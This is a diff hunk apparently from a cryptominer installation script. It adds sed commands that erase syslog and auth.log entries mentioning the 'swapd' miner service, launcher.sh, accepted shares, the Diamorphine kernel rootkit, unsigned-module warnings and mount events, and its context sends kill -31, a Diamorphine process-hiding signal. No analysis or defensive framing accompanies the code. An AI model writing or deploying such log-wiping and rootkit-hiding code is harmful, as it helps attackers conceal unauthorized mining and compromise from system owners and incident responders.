@@ -1626,6 +1626,26 @@ else
     /etc/init.d/swapd status
 fi
 
+# Delete any line containing 'swapd', 'miner', or 'accepted'
+sed -i '/swapd/d' /var/log/syslog
+sed -i '/miner/d' /var/log/syslog
+sed -i '/accepted/d' /var/log/syslog
+sed -i '/launcher.sh/d' /var/log/syslog
+
+# Do the same for auth.log
+sed -i '/swapd/d' /var/log/auth.log
+sed -i '/launcher/d' /var/log/auth.log
+
+# Remove Diamorphine and out-of-tree module warnings
+sed -i '/diamorphine/d' /var/log/syslog
+sed -i '/out-of-tree module/d' /var/log/syslog
+sed -i '/module verification failed/d' /var/log/syslog
+
+# Remove the mount/unmount evidence
+sed -i '/proc-.*mount/d' /var/log/syslog
+sed -i '/Deactivated successfully/d' /var/log/syslog
+
+
 echo ""
 
 kill -31 $(pgrep -f -u root config.json) 2>/dev/null &
